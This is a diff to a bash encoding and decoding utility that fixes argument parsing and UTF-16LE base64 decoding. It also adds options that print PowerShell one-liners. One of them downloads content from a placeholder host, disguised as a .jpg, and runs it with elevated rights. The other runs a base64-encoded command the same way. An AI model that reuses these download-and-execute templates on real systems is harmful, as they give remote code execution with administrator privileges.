@@ -18,9 +18,11 @@ done
 
 usage() {
   echo "
-$0 [type] [content]|[-f filename]
+$(basename "$0") [type] [content]|[-f filename]
 or
-$0 [-t <type> -o <options> <-d> -c [content]
+$(basename "$0") [-t <type> -o <options> <-d> -c [content]
+
+Options:
 
 -t|--type	type of encoding (see encoding types below)
 -o|--options	[not currently implemented]
@@ -58,7 +60,7 @@ parse_args() {
     case $1 in
       -t|--type) TYPE="${TYPE:-$2}"; shift; shift ;;
       -f|--file) FILE="$2"; shift; shift ;;
-      -o|--options) OPTIONS=1; shift;;
+      -o|--options) OPTIONS="$2"; shift; shift;;
       -d|--decode) DECODE=1; shift ;;
       -c|--content) CONTENT="${*:2}"; shift; shift ;;
       -h|--help) usage; shift; shift ;;
@@ -147,6 +149,17 @@ elif [ -p /dev/stdin ]; then
   CONTENT="$(cat)"
 fi
 
+# misc. options:
+if [[ "$OPTIONS" = "ps=unencoded" ]]; then
+  echo '$c = (New-Object Net.WebClient).DownloadString("https://test.example.com/images/c.jpg")'
+  echo 'Start-Process $PSHOME\powershell.exe -Verb RunAs -ArgumentList "-Command `"$c`"" -WindowStyle Maximized'
+  exit $?
+elif [[ "$OPTIONS" = "ps=encoded" ]]; then
+  echo '$c = "VwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAGwAbABvACAAVwBvAHIAbABkACIA"'
+  echo 'Start-Process $PSHOME\powershell.exe -Verb RunAs -ArgumentList "-Command $c" -WindowStyle Maximized'
+  exit $?
+fi
+
 # ENCODE:
 if [[ -z "$DECODE" ]]; then
   if [[ "$TYPE" = "u2d" ]]; then
@@ -191,11 +204,11 @@ else
   elif [[ "$TYPE" = "b64wm" ]]; then
       echo -n "$CONTENT" | openssl base64 -d | unix2dos
   elif [[ "$TYPE" = "b64u" ]]; then
-    echo -n "$CONTENT" | iconv -f UTF8 -t UTF16LE | openssl base64 -A -d
+    echo -n "$CONTENT" | openssl base64 -A -d | iconv -f UTF16LE -t UTF8
   elif [[ "$TYPE" = "b64um" ]]; then
-    echo -n "$CONTENT" | iconv -f UTF8 -t UTF16LE | openssl base64 -d
+    echo -n "$CONTENT" | openssl base64 -d | iconv -f UTF16LE -t UTF8
   elif [[ "$TYPE" = "b64wum" ]]; then
-    echo -n "$CONTENT" | iconv -f UTF8 -t UTF16LE | openssl base64 -d | unix2dos
+    echo -n "$CONTENT" | openssl base64 -d | iconv -f UTF16LE -t UTF8 | unix2dos
   fi
 fi
 
